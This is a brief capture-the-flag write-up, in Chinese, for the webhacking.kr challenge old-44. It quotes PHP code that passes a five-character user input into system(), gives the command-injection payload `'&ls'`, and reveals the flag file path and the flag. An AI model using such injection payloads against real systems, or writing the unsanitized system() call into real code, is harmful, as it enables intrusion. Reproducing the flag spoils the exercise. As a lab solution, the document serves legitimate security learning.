# old-44_500

* 這一題直接看 source code
    ```php=
    if($_POST['id']){
        $id = $_POST['id'];
        $id = substr($id,0,5);
        system("echo 'hello! {$id}'"); // You just need to execute ls
     }
    ```
* 所以很明顯是 command injection 不過有限制五個字
* 稍微試了一下，我最後的 payload 是 `'&ls'`
* 可以拿到 `hello! flag_29cbb98dafb4e471117fec409148e9386753569e index.php`
* 接下來訪問 `http://webhacking.kr:10005/flag_29cbb98dafb4e471117fec409148e9386753569e` 就拿到 flag 拉
* flag : FLAG{y2u.be/sW3RT0tF020}
